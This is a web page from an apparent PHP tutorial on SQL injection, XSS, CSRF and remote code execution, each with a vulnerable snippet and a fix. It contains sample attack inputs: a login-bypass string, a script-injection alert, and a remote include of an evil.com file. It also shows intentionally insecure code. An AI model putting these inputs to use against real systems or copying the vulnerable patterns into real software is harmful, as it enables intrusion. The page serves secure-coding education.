<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Common Security Threats</title>

    <link rel="alternate" href="https://campusempresa.com/mod/php/common-security-threats" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/php/common-security-threats" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/php/common-security-threats" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body>
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo_header.png" style="visibility:hiddenxx;"></a>
			</h1>
		</div>
		<div class="col-4 p-0 text-end">
			<h2 id="main_title"><cite>Building today's and tomorrow's society</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
													<b id="lit_lang_es" class="px-2">EN</b>
				|
				<a href="https://campusempresa.com/mod/php/common-security-threats" class="px-2">ES</a></b>
				|
				<a href="https://campusempresa.cat/mod/php/common-security-threats" class="px-2">CA</a>
					</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/objective">The Project</a>
				<a href="/about">About Us</a>
				<a href="/contribute">Contribute</a>
				<a href="/donate">Donations</a>
				<a href="/licence">License</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content"><div class='row navigation'>
	<div class='col-4'>
					<a href='building-simple-mvc-framework'>&#x25C4;Building a Simple MVC Framework</a>
			</div>
	<div class='col-4 text-center'>
		<a href="./" class="title">Common Security Threats</a>
	</div>
	<div class='col-4 text-end'>
					<a href='data-sanitization-and-validation'>Data Sanitization and Validation &#x25BA;</a>
			</div>
</div>
<div class='content'><p>In this section, we will explore common security threats that PHP developers should be aware of. Understanding these threats is crucial for writing secure PHP applications. We will cover various types of attacks, how they work, and how to mitigate them.</p>
</div><h1>SQL Injection</h1>
<div class='content'><p>SQL Injection is one of the most common and dangerous security threats. It occurs when an attacker is able to manipulate a SQL query by injecting malicious SQL code.</p>
</div><h2>Example of SQL Injection</h2>
<div class='content'><p>Consider the following PHP code that is vulnerable to SQL injection:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJHVzZXJuYW1lID0gJF9HRVRbJ3VzZXJuYW1lJ107CiRwYXNzd29yZCA9ICRfR0VUWydwYXNzd29yZCddOwoKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWUgPSAnJHVzZXJuYW1lJyBBTkQgcGFzc3dvcmQgPSAnJHBhc3N3b3JkJyI7CiRyZXN1bHQgPSBteXNxbGlfcXVlcnkoJGNvbm4sICRxdWVyeSk7Cj8+"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$username = $_GET['username'];
$password = $_GET['password'];

$query = &quot;SELECT * FROM users WHERE username = '$username' AND password = '$password'&quot;;
$result = mysqli_query($conn, $query);
?&gt;</pre></div><div class='content'><p>If an attacker inputs <code>admin' --</code> as the username and anything as the password, the query becomes:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("U0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZSA9ICdhZG1pbicgLS0nIEFORCBwYXNzd29yZCA9ICcn"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>SELECT * FROM users WHERE username = 'admin' --' AND password = ''</pre></div><div class='content'><p>This effectively comments out the password check, allowing the attacker to bypass authentication.</p>
</div><h2>Mitigation</h2>
<div class='content'><p>To prevent SQL injection, always use prepared statements and parameterized queries:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJHVzZXJuYW1lID0gJF9HRVRbJ3VzZXJuYW1lJ107CiRwYXNzd29yZCA9ICRfR0VUWydwYXNzd29yZCddOwoKJHN0bXQgPSAkY29ubi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZSA9ID8gQU5EIHBhc3N3b3JkID0gPyIpOwokc3RtdC0+YmluZF9wYXJhbSgic3MiLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CiRzdG10LT5leGVjdXRlKCk7CiRyZXN1bHQgPSAkc3RtdC0+Z2V0X3Jlc3VsdCgpOwo/Pg=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$username = $_GET['username'];
$password = $_GET['password'];

$stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);
$stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
$stmt-&gt;execute();
$result = $stmt-&gt;get_result();
?&gt;</pre></div><div class='content'></div><h1>Cross-Site Scripting (XSS)</h1>
<div class='content'><p>XSS attacks occur when an attacker injects malicious scripts into content that is then rendered by a user's browser. This can lead to data theft, session hijacking, and other malicious activities.</p>
</div><h2>Example of XSS</h2>
<div class='content'><p>Consider the following PHP code that is vulnerable to XSS:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKZWNobyAiSGVsbG8sICIgLiAkX0dFVFsnbmFtZSddOwo/Pg=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
echo &quot;Hello, &quot; . $_GET['name'];
?&gt;</pre></div><div class='content'><p>If an attacker inputs <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code> as the name, the script will execute in the user's browser.</p>
</div><h2>Mitigation</h2>
<div class='content'><p>To prevent XSS, always sanitize and escape user input:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKZWNobyAiSGVsbG8sICIgLiBodG1sc3BlY2lhbGNoYXJzKCRfR0VUWyduYW1lJ10sIEVOVF9RVU9URVMsICdVVEYtOCcpOwo/Pg=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
echo &quot;Hello, &quot; . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?&gt;</pre></div><div class='content'></div><h1>Cross-Site Request Forgery (CSRF)</h1>
<div class='content'><p>CSRF attacks occur when an attacker tricks a user into performing actions on a web application where they are authenticated. This can lead to unauthorized actions being performed on behalf of the user.</p>
</div><h2>Example of CSRF</h2>
<div class='content'><p>Consider a form that allows a user to change their email address:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PGZvcm0gYWN0aW9uPSJjaGFuZ2VfZW1haWwucGhwIiBtZXRob2Q9IlBPU1QiPgogICAgPGlucHV0IHR5cGU9ImVtYWlsIiBuYW1lPSJlbWFpbCI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ2hhbmdlIEVtYWlsIj4KPC9mb3JtPg=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;form action=&quot;change_email.php&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Change Email&quot;&gt;
&lt;/form&gt;</pre></div><div class='content'><p>An attacker could create a malicious form that submits a request to <code>change_email.php</code> without the user's knowledge.</p>
</div><h2>Mitigation</h2>
<div class='content'><p>To prevent CSRF, use tokens to validate requests:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKc2Vzc2lvbl9zdGFydCgpOwokdG9rZW4gPSBiaW4yaGV4KHJhbmRvbV9ieXRlcygzMikpOwokX1NFU1NJT05bJ3Rva2VuJ10gPSAkdG9rZW47Cj8+Cgo8Zm9ybSBhY3Rpb249ImNoYW5nZV9lbWFpbC5waHAiIG1ldGhvZD0iUE9TVCI+CiAgICA8aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9ImVtYWlsIj4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkdG9rZW47ID8+Ij4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDaGFuZ2UgRW1haWwiPgo8L2Zvcm0+"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
session_start();
$token = bin2hex(random_bytes(32));
$_SESSION['token'] = $token;
?&gt;

&lt;form action=&quot;change_email.php&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $token; ?&gt;&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Change Email&quot;&gt;
&lt;/form&gt;</pre></div><div class='content'><p>In <code>change_email.php</code>, validate the token:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoJF9QT1NUWyd0b2tlbiddICE9PSAkX1NFU1NJT05bJ3Rva2VuJ10pIHsKICAgIGRpZSgiQ1NSRiB0b2tlbiB2YWxpZGF0aW9uIGZhaWxlZCIpOwp9CgovLyBQcm9jZWVkIHdpdGggZW1haWwgY2hhbmdlCj8+"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
session_start();
if ($_POST['token'] !== $_SESSION['token']) {
    die(&quot;CSRF token validation failed&quot;);
}

// Proceed with email change
?&gt;</pre></div><div class='content'></div><h1>Remote Code Execution (RCE)</h1>
<div class='content'><p>RCE occurs when an attacker is able to execute arbitrary code on the server. This can lead to complete server compromise.</p>
</div><h2>Example of RCE</h2>
<div class='content'><p>Consider the following PHP code that is vulnerable to RCE:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJGZpbGVuYW1lID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZW5hbWUpOwo/Pg=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$filename = $_GET['file'];
include($filename);
?&gt;</pre></div><div class='content'><p>If an attacker inputs <code>http://evil.com/malicious.php</code> as the file, the malicious code will be executed on the server.</p>
</div><h2>Mitigation</h2>
<div class='content'><p>To prevent RCE, never include files based on user input. Use a whitelist of allowed files:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJGFsbG93ZWRfZmlsZXMgPSBbJ2hvbWUucGhwJywgJ2Fib3V0LnBocCcsICdjb250YWN0LnBocCddOwokZmlsZW5hbWUgPSAkX0dFVFsnZmlsZSddOwoKaWYgKGluX2FycmF5KCRmaWxlbmFtZSwgJGFsbG93ZWRfZmlsZXMpKSB7CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cn0gZWxzZSB7CiAgICBkaWUoIkludmFsaWQgZmlsZSIpOwp9Cj8+"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$allowed_files = ['home.php', 'about.php', 'contact.php'];
$filename = $_GET['file'];

if (in_array($filename, $allowed_files)) {
    include($filename);
} else {
    die(&quot;Invalid file&quot;);
}
?&gt;</pre></div><div class='content'></div><h1>Summary</h1>
<div class='content'><p>Understanding and mitigating common security threats is essential for PHP developers. Here are the key points to remember:</p>
<ul>
<li><strong>SQL Injection</strong>: Use prepared statements and parameterized queries.</li>
<li><strong>XSS</strong>: Sanitize and escape user input.</li>
<li><strong>CSRF</strong>: Use tokens to validate requests.</li>
<li><strong>RCE</strong>: Avoid including files based on user input; use a whitelist.</li>
</ul>
<p>By following these best practices, you can significantly reduce the risk of security vulnerabilities in your PHP applications.</p>
</div><div class='row navigation'>
	<div class='col-4'>
					<a href='building-simple-mvc-framework'>&#x25C4;Building a Simple MVC Framework</a>
			</div>
	<div class='col-4 text-center'>
		<a href="./" class="title">Common Security Threats</a>
	</div>
	<div class='col-4 text-end'>
					<a href='data-sanitization-and-validation'>Data Sanitization and Validation &#x25BA;</a>
			</div>
</div>
</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Advertising</h1>
			<p>This space is reserved for advertising.</p>
			<p>If you want to be a sponsor, contact us to include links in this area: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Thank you for collaborating!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. All rights reserved</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Accept</a>
    <a href="/cookies">More Information</a>
</div>	

	</div>    
</body>
</html>
